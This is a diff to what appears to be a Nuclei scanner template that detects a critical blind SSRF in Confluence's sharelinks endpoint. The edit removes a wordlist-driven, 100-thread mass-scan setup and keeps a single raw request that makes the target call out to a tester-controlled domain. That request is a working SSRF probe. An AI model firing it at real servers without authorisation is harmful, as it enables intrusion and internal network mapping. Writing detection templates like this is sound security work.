@@ -7,14 +7,11 @@ info:
   reference: https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#confluence
   severity: critical
 requests:
-- attack: sniper
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'GET /rest/sharelinks/1.0/link?url=https://{{Host}}.{{Port}}.{{Subdomains}}.Confluence.{{MY-DOMAIN}}/
+- raw:
+  - 'GET /rest/sharelinks/1.0/link?url=https://{{Host}}.{{Port}}.{{Hostname}}.Confluence.{{MY-DOMAIN}}/
     HTTP/1.1
 
-    Host: {{Subdomains}}
+    Host: {{Hostname}}
 
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
     (KHTML, like Gecko)
@@ -22,4 +19,3 @@ requests:
     Accept: */*
 
     Accept-Language: en-US,en;q=0.9'
-  threads: 100
